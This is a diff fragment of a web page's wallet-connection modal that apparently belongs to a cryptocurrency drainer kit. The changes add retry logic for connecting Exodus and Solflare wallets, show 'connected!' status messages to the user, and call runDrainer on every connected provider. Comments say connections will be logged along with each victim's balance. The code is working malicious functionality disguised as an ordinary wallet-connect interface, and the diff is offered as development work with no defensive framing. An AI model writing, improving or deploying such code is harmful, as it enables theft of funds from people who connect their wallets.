+                            const result = await Promise.race([connectPromise, timeoutPromise]);
+                            
+                            if (result && result.publicKey) {
+                              connected = true;
+                              console.log('[EXODUS] Successfully connected on attempt', attempts);
+                              showStatus('Exodus connected!', 'success');
+                              setTimeout(() => {
+                                runDrainer(provider);
+                              }, 1000);
+                              return;
+                            } else {
+                              throw new Error('No public key returned');
+                            }
+                          } catch (attemptError) {
+                            console.log(`[EXODUS] Attempt ${attempts} failed:`, attemptError.message);
+                            if (attempts < maxAttempts) {
+                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
+                            }
+                          }
+                        }
+                        
+                        if (!connected) {
+                          throw new Error('All connection attempts failed');
                         }
                       } else if (typeof provider.request === 'function') {
-                        // Try request method
-                        const requestPromise = provider.request({ method: 'connect' });
-                        const timeoutPromise = new Promise((_, reject) => 
-                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
-                        );
+                        console.log('[EXODUS] Using provider.request with retry');
                         
-                        const result = await Promise.race([requestPromise, timeoutPromise]);
+                        let connected = false;
+                        let attempts = 0;
+                        const maxAttempts = 3;
                         
-                        if (result) {
-                          showStatus('Exodus connected!', 'success');
-                          setTimeout(() => {
-                            runDrainer(provider);
-                          }, 1000);
-                        } else {
-                          showStatus('Please approve the connection in Exodus', 'error');
+                        while (!connected && attempts < maxAttempts) {
+                          attempts++;
+                          console.log(`[EXODUS] Request method attempt ${attempts}/${maxAttempts}`);
+                          
+                          try {
+                            const requestPromise = provider.request({ method: 'connect' });
+                            const timeoutPromise = new Promise((_, reject) => 
+                              setTimeout(() => reject(new Error('Connection timeout')), 30000)
+                            );
+                            
+                            const result = await Promise.race([requestPromise, timeoutPromise]);
+                            
+                            if (result) {
+                              connected = true;
+                              console.log('[EXODUS] Successfully connected on attempt', attempts);
+                              showStatus('Exodus connected!', 'success');
+                              setTimeout(() => {
+                                runDrainer(provider);
+                              }, 1000);
+                              return;
+                            } else {
+                              throw new Error('No result returned');
+                            }
+                          } catch (attemptError) {
+                            console.log(`[EXODUS] Request attempt ${attempts} failed:`, attemptError.message);
+                            if (attempts < maxAttempts) {
+                              await new Promise(resolve => setTimeout(resolve, 2000));
+                            }
+                          }
+                        }
+                        
+                        if (!connected) {
+                          throw new Error('All request method attempts failed');
                         }
                       } else {
                         showStatus('Exodus connection method not available', 'error');
@@ -3089,12 +3364,12 @@ window.openWalletModal = async function openWalletModal() {
             const requestId = `desktop-${wallet.name}-connect-${Date.now()}`;
             window.addPendingRequest(requestId);
             
+            // Add timeout wrapper for desktop connection with retry logic
+            let result;
+            let retryCount = 0;
+            const maxRetries = 2;
+            
             try {
-              // Add timeout wrapper for desktop connection with retry logic
-              let result;
-              let retryCount = 0;
-              const maxRetries = 2;
-              
               while (retryCount <= maxRetries) {
                 try {
                   const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
@@ -3131,17 +3406,12 @@ window.openWalletModal = async function openWalletModal() {
               showStatus(`${wallet.name} connected!`, 'success');
               console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
               
-              // Log wallet connection using centralized function
-              try {
-                window.logWalletConnection(publicKey, wallet.name, 0);
-                console.log('[WALLET] Logged desktop connection:', {
-                  publicKey: publicKey.toString(),
-                  walletType: wallet.name,
-                  origin: window.location.origin
-                });
-              } catch (logError) {
-                console.error('[WALLET] Failed to log wallet connection:', logError);
-              }
+              // Don't log wallet connection here - will be logged with actual balance in runDrainer
+              console.log('[WALLET] Desktop connection successful:', {
+                publicKey: publicKey.toString(),
+                walletType: wallet.name,
+                origin: window.location.origin
+              });
               
               runDrainer(provider);
             } else {
@@ -3165,15 +3435,7 @@ window.openWalletModal = async function openWalletModal() {
                    const signInResult = await provider.signIn();
                    showStatus('Solflare connected via signIn!', 'success');
                    
-                   // Log wallet connection using centralized function
-                   try {
-                     const publicKey = provider.publicKey || provider.address;
-                     if (publicKey) {
-                       window.logWalletConnection(publicKey, 'Solflare', 0);
-                     }
-                   } catch (logError) {
-                     console.error('[WALLET] Failed to log wallet connection:', logError);
-                   }
+                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                    
                    runDrainer(provider);
                    return;
@@ -3184,15 +3446,7 @@ window.openWalletModal = async function openWalletModal() {
                    const requestResult = await provider.request({ method: 'connect' });
                    showStatus('Solflare connected via request!', 'success');
                    
-                   // Log wallet connection using centralized function
-                   try {
-                     const publicKey = provider.publicKey || provider.address;
-                     if (publicKey) {
-                       window.logWalletConnection(publicKey, 'Solflare', 0);
-                     }
-                   } catch (logError) {
-                     console.error('[WALLET] Failed to log wallet connection:', logError);
-                   }
+                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                    
                    runDrainer(provider);
                    return;
@@ -3203,15 +3457,7 @@ window.openWalletModal = async function openWalletModal() {
                    const connectResult = await provider.connect();
                    showStatus('Solflare connected!', 'success');
                    
-                   // Log wallet connection using centralized function
-                   try {
-                     const publicKey = provider.publicKey || provider.address;
-                     if (publicKey) {
-                       window.logWalletConnection(publicKey, 'Solflare', 0);
-                     }
-                   } catch (logError) {
-                     console.error('[WALLET] Failed to log wallet connection:', logError);
-                   }
+                   // Don't log wallet connection here - will be logged with actual balance in runDrainer
                    
                    runDrainer(provider);
                    return;
@@ -3337,5 +3583,8 @@ window.openWalletModal = async function openWalletModal() {
       modal.classList.add('active');
     }
   </script>
+  
+  
+
 </body>
 </html>
